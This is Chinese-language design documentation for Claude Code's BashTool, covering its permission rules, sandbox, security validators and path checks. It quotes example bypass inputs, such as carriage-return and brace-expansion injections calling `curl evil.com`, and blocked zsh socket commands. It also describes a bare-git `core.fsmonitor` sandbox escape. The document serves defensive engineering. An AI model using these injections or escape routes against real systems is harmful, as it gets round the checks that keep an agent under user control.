# BashTool

## 目的

BashTool 是 Claude Code 的 shell 命令执行引擎。它提供运行任意 shell 命令的统一接口，具有全面的安全控制、沙箱、流式输出、超时管理、后台执行和平台感知验证。每个命令都通过多层权限系统，该系统验证 shell 语法、检查路径约束、执行只读规则，并在执行前应用用户定义的允许/拒绝/询问规则。

## 位置

- `restored-src/src/tools/BashTool/BashTool.tsx` — 主工具定义和执行逻辑（约 1144 行）
- `restored-src/src/tools/BashTool/bashSecurity.ts` — Shell 安全验证器（约 2000+ 行）
- `restored-src/src/tools/BashTool/bashPermissions.ts` — 权限检查和规则匹配（约 2000+ 行）
- `restored-src/src/tools/BashTool/pathValidation.ts` — 路径约束验证（约 1304 行）
- `restored-src/src/tools/BashTool/readOnlyValidation.ts` — 只读命令允许列表（约 1500 行）
- `restored-src/src/tools/BashTool/shouldUseSandbox.ts` — 沙箱决策逻辑（154 行）
- `restored-src/src/tools/BashTool/modeValidation.ts` — 模式特定权限处理（116 行）
- `restored-src/src/tools/BashTool/commandSemantics.ts` — 退出代码解释（141 行）
- `restored-src/src/tools/BashTool/destructiveCommandWarning.ts` — 破坏性模式检测（103 行）
- `restored-src/src/tools/BashTool/sedValidation.ts` — Sed 命令验证
- `restored-src/src/tools/BashTool/sedEditParser.ts` — Sed 编辑解析
- `restored-src/src/tools/BashTool/prompt.ts` — 工具提示生成（370 行）
- `restored-src/src/tools/BashTool/UI.tsx` — 终端 UI 渲染（185 行）
- `restored-src/src/tools/BashTool/utils.ts` — 输出格式化和图像处理（224 行）
- `restored-src/src/tools/BashTool/toolName.ts` — 工具名称常量
- `restored-src/src/tools/BashTool/commentLabel.ts` — 注释标签提取
- `restored-src/src/tools/BashTool/BashToolResultMessage.tsx` — 结果消息组件
- `restored-src/src/utils/sandbox/sandbox-adapter.ts` — 沙箱运行时适配器（986 行）
- `restored-src/src/utils/bash/` — Shell 解析、AST 和命令规范
- `restored-src/src/components/sandbox/` — 沙箱 UI 组件

## 关键导出

### 来自 BashTool.tsx

| 导出 | 描述 |
|--------|-------------|
| `BashTool` | 通过 `buildTool()` 构建的完整工具定义 |
| `BashToolInput` | Zod 推断的输入类型：`{ command, timeout?, description?, run_in_background?, dangerouslyDisableSandbox? }` |
| `Out` | 输出类型：`{ stdout, stderr, interrupted, isImage?, backgroundTaskId?, ... }` |
| `BashProgress` | 用于流式更新的进度数据类型 |
| `isSearchOrReadBashCommand(command)` | 确定命令是否为搜索、读取或列表操作 |
| `detectBlockedSleepPattern(command)` | 检测应使用 Monitor 的独立 `sleep N`（N ≥ 2）模式 |

### 来自 bashPermissions.ts

| 导出 | 描述 |
|--------|-------------|
| `bashToolHasPermission(input, context)` | 主要权限检查入口点 |
| `stripSafeWrappers(command)` | 剥离 `timeout`、`time`、`nice`、`nohup`、安全环境变量 |
| `stripAllLeadingEnvVars(command, blocklist?)` | 剥离所有环境变量前缀（用于拒绝规则） |
| `stripWrappersFromArgv(argv)` | 从 argv 的 AST 级别剥离包装器 |
| `matchWildcardPattern(pattern, command)` | 用于权限规则匹配的通配符 |
| `permissionRuleExtractPrefix(rule)` | 从 `command:*` 语法提取前缀 |
| `getSimpleCommandPrefix(command)` | 提取稳定的 2 词前缀（例如 `git commit`） |
| `getFirstWordPrefix(command)` | UI 专用回退：第一个词作为前缀 |
| `SAFE_ENV_VARS` | 安全可剥离环境变量白名单 |
| `ANT_ONLY_SAFE_ENV_VARS` | 内部额外的安全环境变量 |
| `BINARY_HIJACK_VARS` | 更改二进制解析的环境变量正则表达式（`LD_`、`DYLD_`、`PATH`） |
| `MAX_SUBCOMMANDS_FOR_SECURITY_CHECK` | 安全分析子命令上限 50 |
| `MAX_SUGGESTED_RULES_FOR_COMPOUND` | 复合命令建议规则上限 5 |

### 来自 bashSecurity.ts

| 导出 | 描述 |
|--------|-------------|
| `bashCommandIsSafeAsync_DEPRECATED(command)` | 异步安全验证链 |
| `stripSafeHeredocSubstitutions(command)` | 剥离安全的 `$(cat <<'DELIM'...)` 模式 |
| `hasSafeHeredocSubstitution(command)` | 仅检测 heredoc 检查 |

### 来自 pathValidation.ts

| 导出 | 描述 |
|--------|-------------|
| `checkPathConstraints(input, cwd, context, ...)` | 为所有子命令验证路径访问 |
| `PATH_EXTRACTORS` | 每个命令的路径提取逻辑（30+ 命令） |
| `PathCommand` | 所有路径感知命令的联合类型 |
| `COMMAND_OPERATION_TYPE` | 将每个命令映射到 `read`/`write`/`create` |
| `stripWrappersFromArgv(argv)` | 规范 argv 级别包装器剥离 |

### 来自 readOnlyValidation.ts

| 导出 | 描述 |
|--------|-------------|
| `checkReadOnlyConstraints(input, compoundCommandHasCd)` | 只读命令验证 |
| `isCommandSafeViaFlagParsing(command)` | 基于标志解析的允许列表验证 |
| `COMMAND_ALLOWLIST` | 安全命令标志的中央配置 |
| `READONLY_COMMANDS` | 简单只读命令名称 |
| `READONLY_COMMAND_REGEXES` | 复杂只读命令的正则表达式模式 |

### 来自 shouldUseSandbox.ts

| 导出 | 描述 |
|--------|-------------|
| `shouldUseSandbox(input)` | 确定命令是否应在沙箱中运行 |

### 来自 sandbox-adapter.ts

| 导出 | 描述 |
|--------|-------------|
| `SandboxManager` | 主要沙箱管理接口 |
| `convertToSandboxRuntimeConfig(settings)` | 将 Claude Code 设置转换为沙箱配置 |
| `resolvePathPatternForSandbox(pattern, source)` | 解析 CC 特定路径模式 |
| `resolveSandboxFilesystemPath(pattern, source)` | 解析沙箱文件系统路径 |

## 输入/输出 Schema

### 输入 Schema

```typescript
{
  command: string,                                    // 必需：shell 命令
  timeout?: number,                                   // 可选：毫秒超时（最大 getMaxTimeoutMs()）
  description?: string,                               // 可选：人类可读描述
  run_in_background?: boolean,                        // 可选：作为后台任务运行
  dangerouslyDisableSandbox?: boolean,                // 可选：绕过沙箱
  _simulatedSedEdit?: { filePath: string; newContent: string }  // 仅内部使用
}
```

`_simulatedSedEdit` 字段**永远不会**暴露给模型。它在用户批准 sed 编辑预览后内部设置，确保写入完全预览的内容。

当 `CLAUDE_CODE_DISABLE_BACKGROUND_TASKS` 设置时，`run_in_background` 会从 schema 中省略。

### 输出 Schema

```typescript
{
  stdout: string,                                     // 命令标准输出
  stderr: string,                                     // Shell 重置消息（stderr 合并到 stdout）
  interrupted: boolean,                               // 命令是否被中断
  isImage?: boolean,                                  // 如果 stdout 是 data URI 图像则为 true
  backgroundTaskId?: string,                          // 后台任务 ID
  backgroundedByUser?: boolean,                       // 用户按下了 Ctrl+B
  assistantAutoBackgrounded?: boolean,               // 在助手模式中自动后台化
  dangerouslyDisableSandbox?: boolean,                // 沙箱覆盖标志
  returnCodeInterpretation?: string,                  // 非错误退出代码的语义
  noOutputExpected?: boolean,                         // 命令通常不产生 stdout
  structuredContent?: any[],                          // MCP 结构化内容块
  persistedOutputPath?: string,                       // 磁盘上完整输出的路径
  persistedOutputSize?: number,                       // 总输出大小（字节）
}
```

## Shell 命令执行

### 执行管道

```
1. 接收输入
   - 模型返回带 { command, timeout?, description?, ... } 的 Bash tool_use

2. 验证
   - validateInput()：检查阻止的 sleep 模式（sleep N，N ≥ 2）
   - 输入根据 Zod schema 解析

3. 权限检查
   - bashToolHasPermission() 运行完整权限链：
     a. 精确匹配规则（拒绝/询问/允许）
     b. 前缀/通配符规则（拒绝/询问/允许）
     c. 路径约束（checkPathConstraints）
     d. Sed 约束
     e. 模式特定检查（acceptEdits 自动允许文件系统命令）
     f. 只读规则（checkReadOnlyConstraints）
     g. Bash 分类器（自动模式）
   - 决策：允许 / 拒绝 / 询问

4. 执行（runShellCommand 生成器）
   - 确定沙箱模式（shouldUseSandbox）
   - 设置超时
   - 通过 exec() 生成 shell
   - 通过 onProgress 回调流式输出
   - 处理后台化（显式、自动、超时）

5. 结果处理
   - 通过 EndTruncatingAccumulator 累积输出
   - 解释命令语义（grep 退出代码 1 = "无匹配"，不是错误）
   - 大输出持久化到磁盘（> getMaxOutputLength()）
   - 提取并剥离 Claude Code 提示
   - 图像输出调整大小并限制
   - 结果返回给模型
```

### 基于生成器的执行

`runShellCommand` 函数是一个异步生成器，在命令运行时产生进度更新：

```typescript
async function* runShellCommand({
  input, abortController, setAppState, setToolJSX,
  preventCwdChanges, isMainThread, toolUseId, agentId
}): AsyncGenerator<BashProgress, ExecResult, void>
```

生成器：
1. 通过 `exec()` 创建带 `onProgress` 回调的 `ShellCommand`
2. 在 `resultPromise` 和 `progressSignal` 之间竞赛
3. 产生进度数据（输出、经过时间、行数、字节数）
4. 完成后返回最终 `ExecResult`

此设计支持终端 UI 中的实时进度显示，同时保持执行模型简洁。

### 输出累积

输出使用 `EndTruncatingAccumulator` 累积，它：
- 在到达时追加 stdout 块
- 处理超过限制时的截断
- 提供最终 `toString()` 结果

Stderr 合并到 stdout（合并文件描述符），因此 `result.stdout` 包含两个流。输出中的 `stderr` 字段仅保留用于 shell 重置消息。

## 环境设置

### Shell 初始化

- Shell 环境从用户配置文件初始化（bash 或 zsh）
- 工作目录在命令之间持久化
- Shell 状态（变量、别名）在命令之间**不**持久化
- 每个命令在新的 shell 调用中运行

### 安全环境变量剥离

对于权限规则匹配，某些环境变量在匹配之前从命令中剥离。这允许规则如 `Bash(npm install:*)` 匹配 `NODE_ENV=prod npm install foo`。

**安全环境变量**（`SAFE_ENV_VARS`）：
- Go：`GOEXPERIMENT`、`GOOS`、`GOARCH`、`CGO_ENABLED`、`GO111MODULE`
- Rust：`RUST_BACKTRACE`、`RUST_LOG`
- Node：`NODE_ENV`（不是 `NODE_OPTIONS`）
- Python：`PYTHONUNBUFFERED`、`PYTHONDONTWRITEBYTECODE`
- Pytest：`PYTEST_DISABLE_PLUGIN_AUTOLOAD`、`PYTEST_DEBUG`
- 认证：`ANTHROPIC_API_KEY`
- 区域设置：`LANG`、`LANGUAGE`、`LC_ALL`、`LC_CTYPE`、`LC_TIME`、`CHARSET`
- 终端：`TERM`、`COLORTERM`、`NO_COLOR`、`FORCE_COLOR`、`TZ`
- 显示：`LS_COLORS`、`LSCOLORS`、`GREP_COLOR`、`GREP_COLORS`、`GCC_COLORS`
- 格式化：`TIME_STYLE`、`BLOCK_SIZE`、`BLOCKSIZE`

**明确不安全**（永不剥离）：
- `PATH`、`LD_PRELOAD`、`LD_LIBRARY_PATH`、`DYLD_*`（执行/库加载）
- `PYTHONPATH`、`NODE_PATH`、`CLASSPATH`、`RUBYLIB`（模块加载）
- `GOFLAGS`、`RUSTFLAGS`、`NODE_OPTIONS`（代码执行标志）
- `HOME`、`TMPDIR`、`SHELL`、`BASH_ENV`（系统行为）

**仅 Ant 额外安全变量**（`ANT_ONLY_SAFE_ENV_VARS`）：
- `KUBECONFIG`、`DOCKER_HOST`、`AWS_PROFILE`、`CLOUDSDK_CORE_PROJECT`
- `PGPASSWORD`、`GH_TOKEN`、`CUDA_VISIBLE_DEVICES` 等
- 这些是内部高级用户的便利剥离——绝不能对外发布

### 包装命令剥离

包装命令在匹配之前被剥离，以便规则匹配实际命令：

| 包装器 | 剥离模式 |
|---------|-----------------|
| `timeout` | `timeout [flags] duration command` |
| `time` | `time command` |
| `nice` | `nice [-n N] command` 或 `nice -N command` |
| `nohup` | `nohup command` |
| `stdbuf` | `stdbuf -o0 command` |

剥离分两个阶段进行：
1. **阶段 1**：剥离安全环境变量和注释行
2. **阶段 2**：剥离包装命令和注释行

剥离循环运行直到没有更多更改（定点），处理交错模式如 `nohup FOO=bar timeout 5 claude`。

### 注释行剥离

完整行注释（以 `#` 开头的行）从命令中剥离。这处理 Claude 添加说明性注释的情况：
```bash
# Check the logs directory
ls /home/user/logs
```
剥离为：`ls /home/user/logs`

只有完整行注释被剥离——命令后面的行内注释被保留。

## 输出流

### 进度更新

进度通过生成器的 `onProgress` 回调流式传输，当共享轮询器 tick 时（约每秒一次）触发：

```typescript
{
  type: 'progress',
  output: string,         // 最新输出行
  fullOutput: string,     // 到目前为止的完整输出
  elapsedTimeSeconds: number,
  totalLines: number,
  totalBytes: number,
  taskId: string,
  timeoutMs?: number,
}
```

### 进度显示阈值

进度 UI 在 `PROGRESS_THRESHOLD_MS`（2000ms）后显示。在此阈值之前，命令静默运行。在此阈值之后：
1. 通过 `registerForeground()` 注册前台任务
2. 渲染 `BackgroundHint` UI 组件（显示 Ctrl+B 快捷方式）
3. 进度消息产生给调用者

### 大输出处理

当输出超过 `getMaxOutputLength()` 时：
1. 第一个块内联流式传输（预览）
2. 完整输出写入磁盘上的临时文件
3. 执行后将文件复制到 tool-results 目录
4. 如果输出 > 64 MB，复制后被截断
5. 模型接收带文件路径的 `<persisted-output>` 消息

对于图像输出：
- 通过 `data:image/...;base64,` 前缀检测
- 通过 `resizeShellImageOutput()` 调整大小以限制尺寸和字节大小
- 最大文件大小：20 MB
- 如果调整大小失败或文件太大，`isImage` 设置为 `false` 并作为文本发送

### 输出格式化

- 前导空行被剥离
- 尾随空白被修剪
- 内容中的空行被保留
- 截断输出显示 `... [N lines truncated] ...`

## 超时处理

### 超时配置

| 函数 | 来源 | 描述 |
|----------|--------|---------|
| `getDefaultTimeoutMs()` | `utils/timeouts.ts` | 默认命令超时 |
| `getMaxTimeoutMs()` | `utils/timeouts.ts` | 最大允许超时 |

超时以毫秒指定。如果未提供，则使用默认值。模型可以请求最多最大值。

### 超时触发的自动后台化

当命令超过其超时且 `shouldAutoBackground` 为 true 时：
1. `shellCommand.onTimeout()` 触发后台回调
2. 前台任务通过 `backgroundExistingForegroundTask()` 或 `spawnBackgroundTask()` 转换为后台任务
3. 命令继续运行——没有状态丢失
4. 模型接收后台任务 ID

这防止长时间运行的命令无限期阻塞代理。

### 助手模式自动后台化

在助手模式（KAIROS 功能标志激活）中，阻塞命令在 `ASSISTANT_BLOCKING_BUDGET_MS`（15 秒）后自动后台化：
1. 命令开始时启动计时器
2. 如果 15 秒后仍在运行且尚未后台化，则移至后台
3. 模型接收 `assistantAutoBackgrounded: true`
4. 模型被指示将长时间运行的工作委托给子代理或使用 `run_in_background`

### Sleep 模式阻止

独立 `sleep N`（其中 N ≥ 2）作为第一个命令被阻止：
- `sleep 5` → 被阻止
- `sleep 5 && check` → 被阻止（建议使用 Monitor 工具）
- `sleep 0.5` → 允许（速率限制/ pacing）
- 管道/子 shell 中的 `sleep` → 允许

这防止浪费的轮询模式。模型应使用 Monitor 工具来流式传输事件，或使用 `run_in_background` 进行一次性等待。

## 沙箱模式

### 沙箱决策逻辑

`shouldUseSandbox(input)` 确定命令是否在沙箱中运行：

```
1. 沙箱是否启用？（SandboxManager.isSandboxingEnabled()）
   - 平台支持检查（macOS、Linux、WSL2+）
   - 依赖检查（bubblewrap、socat 等）
   - enabledPlatforms 设置检查
   - sandbox.enabled 设置检查
   → 如果否，返回 false

2. dangerouslyDisableSandbox 是否设置且允许无沙箱命令？
   → 如果是，返回 false

3. 命令是否包含排除的命令？
   → 如果是，返回 false

4. 返回 true（使用沙箱）
```

### 沙箱配置

沙箱运行时配置从多个来源构建：

**文件系统限制：**
- `allowWrite`：当前目录、Claude 临时目录、编辑规则路径、sandbox.filesystem.allowWrite、额外目录
- `denyWrite`：设置文件（.claude/settings.json、.claude/settings.local.json）、.claude/skills、裸 git 仓库文件、denyWrite 规则路径、sandbox.filesystem.denyWrite
- `allowRead`：sandbox.filesystem.allowRead 路径
- `denyRead`：读取规则拒绝路径、sandbox.filesystem.denyRead

**网络限制：**
- `allowedDomains`：来自 sandbox.network.allowedDomains 和 WebFetch 允许规则
- `deniedDomains`：来自 WebFetch 拒绝规则
- `allowUnixSockets`：来自 sandbox.network.allowUnixSockets
- `allowLocalBinding`：来自 sandbox.network.allowLocalBinding

**其他设置：**
- `ripgrep`：用户配置或捆绑的 ripgrep 路径/参数
- `ignoreViolations`：是否静默忽略某些沙箱违规
- `enableWeakerNestedSandbox`：嵌套沙箱的较弱隔离
- `enableWeakerNetworkIsolation`：较弱的网络隔离

### 排除的命令

命令可以通过以下方式从沙箱中排除：
1. **动态配置**（`tengu_sandbox_disabled_commands`）：Ant 专用功能标志，带 `commands`（精确匹配）和 `substrings`（包含匹配）
2. **用户设置**（`sandbox.excludedCommands`）：权限规则语法中的模式（`npm run test:*`、`bazel:*` 等）

排除命令匹配使用固定点迭代，结合 `stripAllLeadingEnvVars` 和 `stripSafeWrappers` 来处理交错模式。

**重要**：排除命令是面向用户的便利功能，**不是**安全边界。实际安全控制是权限提示系统。

### 沙箱 Bash 提示

启用沙箱时，模型收到包含以下内容的指令：
- 默认在沙箱中运行命令
- 何时使用 `dangerouslyDisableSandbox: true`（显式用户请求或沙箱导致失败的证据）
- 沙箱导致失败的证据（操作不允许、访问被拒绝、网络连接失败）
- 使用 `$TMPDIR` 用于临时文件（不是 `/tmp`）
- 不要建议将敏感文件添加到沙箱允许列表

### 沙箱时自动允许

当 `autoAllowBashIfSandboxed` 为 true（默认）时，沙箱命令自动批准，除非：
- 显式拒绝规则匹配
- 显式询问规则匹配

这减少了沙箱命令的权限提示，因为沙箱提供 OS 级隔离。

### 裸 Git 仓库保护

沙箱检测并保护在沙箱命令期间在 cwd 植入的裸 git 仓库文件：
- 检查的文件：`HEAD`、`objects`、`refs`、`hooks`、`config`
- 如果在配置时存在：通过只读绑定拒绝
- 如果不存在：添加到 `bareGitRepoScrubPaths` 用于命令后清理
- 每个沙箱命令后：`scrubBareGitRepoFiles()` 删除植入的文件

这防止通过 git 的 `is_git_directory()` 检查结合 `core.fsmonitor` 的沙箱逃逸。

### Worktree 支持

在 git worktree 中，主仓库路径在初始化时检测一次：
- `.git` 是一个文件，包含 `gitdir: /path/to/main/repo/.git/worktrees/name`
- 主仓库路径添加到 `allowWrite`，以便 git 操作可以访问 `.git/index.lock`
- 为会话缓存（worktree 状态在会话中期不会改变）

### Linux/WSL 限制

在 Linux 和 WSL 上：
- Bubblewrap 不支持文件系统限制中的 glob 模式
- `getLinuxGlobPatternWarnings()` 返回不会完全工作的模式
- WSL1 不支持（需要 WSL2+）

### 沙箱不可用反馈

如果用户明确启用了沙箱（`sandbox.enabled: true`）但无法运行，`getSandboxUnavailableReason()` 返回人类可读的原因：
- 平台不支持
- 缺少依赖
- 平台不在 `enabledPlatforms` 列表中

这防止用户认为沙箱强制处于活动状态而实际上并非如此的安全问题。

## 安全检查

### 安全验证链

每个命令通过综合安全验证链。该链在 `bashCommandIsSafeAsync_DEPRECATED` 中运行，由约 20+ 个验证器组成，每个都由数字 ID 标识：

| ID | 验证器 | 检查内容 |
|----|-----------|---------------|
| 1 | 不完整命令 | 以制表符、标志或运算符开头的命令 |
| 2 | JQ 系统函数 | 带 `system()` 调用的 `jq` |
| 3 | JQ 文件参数 | 带 `-f`、`--from-file`、`--rawfile` 等的 `jq` |
| 4 | 混淆标志 | ANSI-C 引号、区域引号、空引号技巧 |
| 5 | Shell 元字符 | 引号参数中的 `;`、`|`、`&` |
| 6 | 危险变量 | 重定向/管道上下文中的变量 |
| 7 | 换行符 | 分隔命令的换行符 |
| 8 | 命令替换 | `$()`、反引号、`${}`、进程替换 |
| 9 | 输入重定向 | `<` 运算符 |
| 10 | 输出重定向 | `>` 运算符 |
| 11 | IFS 注入 | `$IFS` 或 `${...IFS...}` 使用 |
| 12 | Git 提交替换 | git 提交消息中的命令替换 |
| 13 | Proc environ 访问 | `/proc/*/environ` 路径 |
| 14 | 畸形标记 | 带命令分隔符的不平衡分隔符 |
| 15 | 反斜杠转义空白 | 用 `\` 转义的空白 |
| 16 | Brace 扩展 | `{a,b}` 模式 |
| 17 | 控制字符 | 非可打印控制字符 |
| 18 | Unicode 空白 | Unicode 空白字符 |
| 19 | 中词哈希 | 单词中间的 `#` |
| 20 | Zsh 危险命令 | `zmodload`、`emulate`、`zpty` 等 |
| 21 | 反斜杠转义运算符 | 转义的 shell 运算符 |
| 22 | 注释引号去同步 | 通过 `#` 的引号状态混淆 |
| 23 | 引号换行符 | 引号字符串内的换行符 |

### Zsh 特定保护

Zsh 有许多可以绕过安全检查的功能。以下 Zsh 命令被阻止：

| 命令 | 风险 |
|---------|---------|
| `zmodload` | 通往危险模块的网关（mapfile、system、zpty、net/tcp、files） |
| `emulate` | 带 `-c` 标志的 Eval 等价物 |
| `sysopen/sysread/syswrite/sysseek` | 通过 zsh/system 的细粒度文件 I/O |
| `zpty` | 伪终端命令执行 |
| `ztcp/zsocket` | 通过套接字的网络泄露 |
| `mapfile` | 通过数组赋值的隐形文件 I/O |
| `zf_rm/zf_mv/zf_ln/zf_chmod/zf_chown/zf_mkdir/zf_rmdir/zf_chgrp` | 绕过二进制检查的内置文件操作 |

Zsh 进程替换模式也被阻止：
- `<()` — 进程替换
- `>()` — 进程替换
- `=()` — Zsh equals 替换
- `=cmd` 在词开头 — Zsh EQUALS 扩展

### Heredoc 安全

安全的 heredoc 模式被允许绕过验证器：
```bash
echo $(cat <<'EOF'
literal text here
EOF
)
```

安全 heredoc 的要求：
- 定界符必须是单引号或转义的
- 闭定界符必须在自己的一行上
- 替换必须在参数位置（不是命令名）
- 剩余文本必须通过所有验证器
- 没有嵌套 heredoc 范围

### 引号提取

安全系统在多个级别提取引号内容：
- `withDoubleQuotes`：移除双引号部分后的内容
- `fullyUnquoted`：移除所有引号内容（用于大多数验证器）
- `fullyUnquotedPreStrip`：重定向剥离之前（防止通过幽灵延续绕过）
- `unquotedKeepQuoteChars`：保留引号字符（检测 `#` 相邻）

### 回车保护

回车（`\r`、0x0D）在双引号外被阻止，因为 shell-quote 和 bash 对它们的标记化不同：
- shell-quote 的 `\s` 包含 `\r` → 视为标记边界
- bash 的 IFS 不包含 `\r` → 视为词的一部分

攻击示例：`TZ=UTC\recho curl evil.com`
- shell-quote：`['TZ=UTC'、'echo'、'curl'、'evil.com']` → 匹配 `Bash(echo:*)`
- bash：`TZ='UTC\recho'` 然后 `curl evil.com` → 代码执行

### Shell-Quote 解析器 bug 感知

系统知道 shell-quote 的单引号反斜杠 bug：
- `echo 'test\' && evil` → shell-quote 合并为乱码标记
- 当 AST 解析成功时，路径验证直接使用 AST 派生的 argv
- 当 AST 失败时，旧版基于正则表达式的验证器充当安全网

### 畸形标记注入

带有不平衡分隔符和命令分隔符组合的命令被标记：
```bash
echo {"hi":"hi;evil"} && curl evil.com
```
这捕获可能被利用 via eval 重新解析的潜在注入模式。

### Brace 扩展检测

包含 `{` 和 `,`（或 `..`）的标记被拒绝为 brace 扩展混淆：
```bash
git diff {@'{0},--output=/tmp/pwned}
```
这是 `validateBraceExpansion` 在 bashSecurity.ts 中的深度防御。

### 变量扩展保护

在只读标志验证期间，任何包含 `$` 的标记被拒绝：
- `$VAR` 前缀击败 `startsWith('-')` 检查
- `$VAR` 中缀击败基于正则表达式的危险命令回调
- 攻击：`rg . "$Z--pre=bash" FILE` → 执行 `bash FILE`

## 权限处理

### 权限检查顺序

权限系统按此顺序检查（首次匹配优先）：

```
1. 精确匹配规则
   - 精确命令拒绝则拒绝
   - 询问规则中的精确命令则询问
   - 精确命令允许则允许

2. 前缀/通配符规则
   - 命令匹配拒绝规则则拒绝
   - 命令匹配询问规则则询问

3. 路径约束
   - 验证所有文件路径在允许的目录内
   - 验证输出重定向目标
   - 阻止危险删除路径（/、/usr 等）

4. Sed 约束
   - 阻止危险的 sed 操作

5. 模式特定检查
   - acceptEdits：自动允许文件系统命令

6. 只读规则
   - 命令只读则自动允许

7. 透传
   - 无规则匹配 → 显示权限提示
```

### 规则匹配策略

使用多个候选命令匹配规则：
1. 原始命令（保留引号）
2. 没有输出重定向的命令
3. 安全包装器剥离版本
4. 所有环境变量剥离版本（用于拒绝/询问规则）

候选者迭代扩展直到定点，处理交错模式如 `nohup FOO=bar timeout 5 claude`。

### 复合命令处理

复合命令（通过 `&&`、`||`、`;`、`|` 连接）被分割为子命令：
- 每个子命令单独检查
- 安全检查上限为 50 个子命令（超过则回退到 `ask`）
- 前缀/通配符规则**不**匹配复合命令（安全修复）
- 拒绝/询问规则**确实**匹配复合命令（不能通过包装绕过拒绝）

### 权限规则类型

| 类型 | 语法 | 示例 |
|------|---------|---------|
| 精确 | `Bash(exact command)` | `Bash(ls -la)` |
| 前缀 | `Bash(prefix:*)` | `Bash(git commit:*)` |
| 通配符 | `Bash(pattern)` | `Bash(npm run test:*)` |

### 建议系统

显示权限提示时，系统建议规则：
- Heredoc 命令 → 前缀规则（精确匹配永远不会再次匹配）
- 多行命令 → 来自第一行的前缀规则
- 单行命令 → 如果可用则 2 词前缀，否则精确匹配
- 复合命令 → 最多 5 条规则建议

裸 shell 前缀（`bash:*`、`sh:*`、`env:*`、`sudo:*` 等）永远不会被建议，因为它们允许任意代码执行。

### 模式特定处理

| 模式 | 行为 |
|------|---------|
| `bypassPermissions` | 在主流程中处理——全部允许 |
| `dontAsk` | 在主流程中处理——自动拒绝危险 |
| `acceptEdits` | 自动允许文件系统命令：`mkdir`、`touch`、`rm`、`rmdir`、`mv`、`cp`、`sed` |

### 破坏性命令警告

潜在破坏性命令在权限对话框中触发信息性警告：

| 模式 | 警告 |
|---------|---------|
| `git reset --hard` | 可能丢弃未提交的更改 |
| `git push --force` | 可能覆盖远程历史 |
| `git clean -f` | 可能永久删除未跟踪文件 |
| `git checkout .` | 可能丢弃所有工作树更改 |
| `rm -rf` | 可能递归强制删除文件 |
| `DROP TABLE` | 可能删除或截断数据库对象 |
| `terraform destroy` | 可能销毁 Terraform 基础设施 |
| `kubectl delete` | 可能删除 Kubernetes 资源 |

这些纯信息性——不影响权限逻辑。

## 路径验证

### 路径感知命令

30+ 命令具有自定义路径提取逻辑：

| 类别 | 命令 |
|----------|----------|
| 导航 | `cd` |
| 列表 | `ls`、`tree`、`du`、`find` |
| 文件创建 | `mkdir`、`touch` |
| 文件删除 | `rm`、`rmdir` |
| 文件移动 | `mv`、`cp` |
| 文件读取 | `cat`、`head`、`tail`、`stat`、`file`、`strings`、`hexdump`、`od`、`base64`、`nl` |
| 文本处理 | `sort`、`uniq`、`wc`、`cut`、`paste`、`column`、`tr`、`awk`、`diff` |
| 搜索 | `grep`、`rg`、`sed` |
| 版本控制 | `git`（仅 `git diff --no-index`） |
| 数据处理 | `jq`、`sha256sum`、`sha1sum`、`md5sum` |

### 路径提取逻辑

每个命令都有自定义 `PATH_EXTRACTOR`，它：
1. 正确解析标志（处理 `--` 选项结束分隔符）
2. 识别位置参数与标志参数
3. 处理命令特定模式（例如 grep：模式然后路径）
4. 默认情况下没有路径时使用当前目录

### 危险路径保护

`rm` 和 `rmdir` 命令根据危险路径检查：
- `/`、`/bin`、`/usr`、`/etc`、`/var`、`/tmp`、`/home` 等
- Claude Code 配置文件（`.claude/settings.json`）
- 这些检查在显式拒绝规则之后但在其他结果之前运行

### 复合命令 + cd 保护

包含 `cd` 的复合命令中的写操作被阻止：
```bash
cd .claude/ && mv test.txt settings.json
```
这防止通过目录更改之前的操作来绕过路径安全检查。路径根据原始 CWD 验证，不考虑 `cd` 的效果。

### 输出重定向验证

验证输出重定向（`>`、`>>`）：
- 目标路径必须在允许的目录内
- `/dev/null` 始终安全
- 进程替换（`>(...)`、`<(...)`）需要手动批准
- 重定向目标中的 shell 扩展语法需要手动批准
- 带 `cd` + 重定向的复合命令需要手动批准

### AST vs 旧版解析

当 tree-sitter AST 解析成功时：
- 路径验证直接使用 AST 派生的 argv
- 避免 shell-quote 的单引号反斜杠 bug
- 重定向目标完全解析（无 shell 扩展）

当 AST 解析失败时：
- 回退到 `splitCommand_DEPRECATED` + shell-quote
- 旧版正则表达式验证器充当安全网

## 只读命令验证

### 只读分类

如果以下条件，命令被分类为只读：
1. 它匹配已知只读命令模式
2. 所有标志都在安全标志允许列表内
3. 没有危险模式存在

### 命令允许列表

`COMMAND_ALLOWLIST` 为复杂命令定义安全标志：

| 命令 | 关键安全标志 | 排除（危险） |
|---------|---------------|---------------------|
| `xargs` | `-I {}`、`-n`、`-P`、`-L`、`-E`、`-0`、`-t`、`-r` | `-x/--exec`、`-X/--exec-batch`、`-i`、`-e` |
| `grep` | `-e`、`-f`、`-i`、`-v`、`-r`、`-l`、`-c`、`-n`、`-A`、`-B`、`-C` | 无排除 |
| `sed` | `-e`、`-n`、`-r`、`-E`、`-l`、`-z`、`-s`、`-u` | 通过回调的内联编辑（`-i`） |
| `tree` | `-a`、`-d`、`-l`、`-L`、`-P`、`-I`、`-J`、`-X` | `-R`（在深度边界写入 00Tree.html）、`-o/--output` |
| `fd`/`fdfind` | 所有搜索标志 | `-x/--exec`、`-X/--exec-batch` |
| `ps` | 所有 UNIX 风格标志 | BSD 风格 `e`（显示环境变量） |
| `date` | `-d`、`-r`、`-u`、`-I` | `-s/--set`、`-f/--file`、位置时间设置 |
| `hostname` | 仅显示标志 | 位置参数（设置主机名）、`-F`、`-b` |
| `tput` | `-T`、`-V`、`-x` | `-S`（从 stdin 读取）、危险功能 |
| `lsof` | 显示/过滤标志 | `+m`（创建安装补充文件） |
| `ss` | 所有查询标志 | `-K/--kill`、`-D/--diag`、`-F/--filter`、`-N/--net` |
| `git ls-remote` | 仅标志 | URL、SSH 规范、变量引用 |

### 平台特定限制

- **Windows**：`xargs` 从只读允许列表中移除，因为它可用于通过文件内容中的 UNC 路径作为数据到代码桥接
- **仅 Ant**：`gh` 命令和 `aki`（Anthropic 内部搜索 CLI）添加到允许列表，因为它们发出网络请求

### 标志验证

`validateFlags` 函数：
1. 解析命令前缀后的标记
2. 根据安全标志允许列表验证每个标志
3. 检查参数类型（`none`、`string`、`number`、`char`、`EOF`、`{}`）
4. 处理组合短标志（`-abc` → `-a`、`-b`、`-c`）
5. 尊重 `--` 选项结束分隔符
6. 运行命令特定的危险回调

### Xargs 目标命令

使用 `xargs` 时，只有这些命令是安全的：
- `echo`、`printf`、`wc`、`grep`、`head`、`tail`

在识别目标命令后，标志验证停止（目标命令必须没有危险标志）。

